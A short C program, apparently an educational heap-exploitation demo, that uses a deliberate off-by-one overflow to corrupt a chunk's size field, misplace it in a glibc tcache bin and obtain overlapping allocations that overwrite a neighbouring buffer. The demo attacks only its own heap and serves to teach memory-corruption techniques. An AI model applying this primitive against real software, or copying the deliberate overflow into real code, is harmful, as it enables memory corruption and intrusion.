#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {

	int i;
	char *a, *b, *c;

	// Allocate three chunks for use in our exploit. We'll use a size
	// of 24, because 24+8=32 which is a nice round number, giving us
	// three allocations of size=0x20 to work with.

	a = malloc(24);
	b = malloc(24);
	c = malloc(24);

	// Let's copy some important information into the third one.
	// Gee I hope it's safe here!

	strcpy(c, "very important info");

	// Simulate a one-byte heap overflow, allowing us to modify the
	// 'size' of the next chunk.  We'll overflow the 'a' buffer, thus
	// altering b's chunk size to be 0x40, whoops!  This is the vuln!

	// Note here that ascii 'A' is 0x41, conveniently giving...
	//   chunk size = 0x40
	//   A M P      = 001

	for (i=0; i<=24; i++)	// "<=" here results in a one-byte overflow
		a[i] = 'A';

	// Heap chunks now look like...
	//   a [size=0x20]: AAAAAAAAAAAAAAAAAAAAAAAA
	//   b [size=0x40]: empty
	//   c [size=0x20]: very important info

	// Free 'b'.  Because we altered its chunk size metadata it will get
	// added to the wrong tcache bin (0x40 instead of 0x20).

	free(b);

	// Heap now looks like...
	//
	//   a [size=0x20]: AAAAAAAAAAAAAAAAAAAAAAAA
	//   b [size=0x40]: (free'd)
	//   c [size=0x20]: very important info
	//
	//   tcache[0x40]: (b)

	// Allocate a chunk of size=56, because 56+8=64 i.e. 0x40
	// This will return the chunk from the tcache we just free'd,
	// which now overlaps 'c'!

	b = malloc(56);

	// Heap layout now looks something like...
	//
	// a: [..... 0x20 .....]
	// b:                   [............ 0x40 ............]
	// c:                                 [..... 0x20 .....]

	// Write safely within the bounds of 'b', however because the two
	// chunks b/c overlap, we will be clobbering 'c' also, whoops!

	for (i=0; i<56; i++)
		b[i] = 'B';

	// Let's see if it worked!  Print out c, which should now be altered

	printf("Contents of 'c' is: %s", c);

}
